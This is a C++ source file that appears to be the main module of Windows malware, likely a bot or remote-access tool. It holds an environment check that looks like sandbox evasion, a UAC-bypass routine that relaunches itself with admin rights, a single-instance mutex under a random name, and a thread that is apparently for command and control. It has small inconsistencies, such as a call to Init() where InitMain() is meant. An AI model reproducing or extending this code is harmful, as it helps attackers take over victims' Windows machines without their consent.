#include "ExeMain.h"

char szInstanceName[] = "ekLlwBglw5";
WCHAR wcsInstanceName[] = L"ekLlwBglw5";

WCHAR *g_szMutex = wcsInstanceName;
HANDLE g_hMutex;
ThreadHub g_ThreadHub;
MessageRoutine g_MesssageRoutine;
InternetRoutine g_InternetRoutine;

void InitMain();
void Exit();
bool IsRunning(LPCWSTR szMutex);
void ExitProgram(HANDLE hMutex);

void MessageRoutineStub() {
	g_MesssageRoutine.MessageMainThread();
}

void InternetRoutineStub() {
	g_InternetRoutine.InternetMainThread();
}

bool GetProcessIdByName(LPTSTR szProcessName, LPDWORD lpPID)
{
	STARTUPINFO st;
	PROCESS_INFORMATION pi;
	PROCESSENTRY32 ps;
	HANDLE hSnapshot;
	ZeroMemory(&st, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	st.cb = sizeof(STARTUPINFO);
	ZeroMemory(&ps, sizeof(PROCESSENTRY32));
	ps.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return false;

	if (!Process32First(hSnapshot, &ps))
		return false;
	do
	{
		if (lstrcmpi(ps.szExeFile, szProcessName) == 0)
		{
			*lpPID = ps.th32ProcessID;
			CloseHandle(hSnapshot);
			return TRUE;
		}
	} while (Process32Next(hSnapshot, &ps));
	CloseHandle(hSnapshot);
	return false;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow) {
	UACHelper uacHelper;
	Environment environment;
	if (!environment.IsRunnable())
		exit(0);
#ifdef _DEBUG_
	InitMain();
	g_ThreadHub.JoinAll();
	return 0;
#else
	if (!uacHelper.IsAdmin()) {
		WCHAR szPath[MAX_PATH];
		GetModuleFileName(NULL, szPath, MAX_PATH);
		uacHelper.BypassUacRun(szPath);
		exit(0);
	}
	else {
		uacHelper.CleanUp();
		Init();
		exit(0);
	}
	ExitProgram(g_hMutex);
	return 0;
#endif
}

void InitMain() {
	SetProcessDPIAware();
	//load config
	g_InternetRoutine.SetMessageRoutine(&g_MesssageRoutine);
	g_InternetRoutine.SetThreadHub(&g_ThreadHub);
	g_MesssageRoutine.SetThreadHub(&g_ThreadHub);
	g_InternetRoutine.SetMainStub(InternetRoutineStub);
	g_MesssageRoutine.SetMainStub(MessageRoutineStub);
	g_ThreadHub.AddRoutine(InternetRoutineStub, ThreadHub::Internet);
	g_ThreadHub.AddRoutine(MessageRoutineStub, ThreadHub::Maintainance);
	g_ThreadHub.StartRoutine(InternetRoutineStub);
	g_ThreadHub.StartRoutine(MessageRoutineStub);
}

void Exit() {

}

bool IsRunning(LPCWSTR szMutex) {
	g_hMutex = CreateMutex(NULL, false, szMutex);
	if (!g_hMutex)
		return true;
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		return true;
	return false;
}

void ExitProgram(HANDLE hMutex) {
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	exit(0);
}